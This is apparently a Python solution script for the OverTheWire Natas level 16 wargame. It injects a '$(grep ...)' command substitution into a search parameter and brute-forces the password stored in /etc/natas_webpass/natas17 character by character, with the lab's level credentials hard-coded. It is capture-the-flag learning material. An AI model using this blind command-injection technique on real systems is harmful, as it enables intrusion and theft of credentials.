import requests
import string
from os import system

url = "http://natas16.natas.labs.overthewire.org/?"

user = "natas16"
passw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

urlparams = "needle="
charstrings = string.ascii_letters + string.digits
i = 0
inject = "8Ps3Ha"
payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'

resp = requests.get(url + urlparams + payload, auth=(user, passw))

natas17 = "8Ps3H"
while(len(natas17) < 33):
    if "dooms" in resp.text:
        if len(inject) < 2:
            i += 1
            inject = charstrings[i]
            payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'
        else:
            i += 1
            inject = inject[:-1] + charstrings[i]
            payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'

    else:
        natas17 += charstrings[i]
        print(f"natas17 : {natas17}")
        i = 0
        inject += charstrings[i]
        payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'

    resp = requests.get(url + urlparams + payload, auth=(user, passw))
    system('clear')
    print(f"Testing : {inject}")
    print(f"natas17 : {natas17}")

with open("index.html", "w") as f:
    f.write(resp.text)
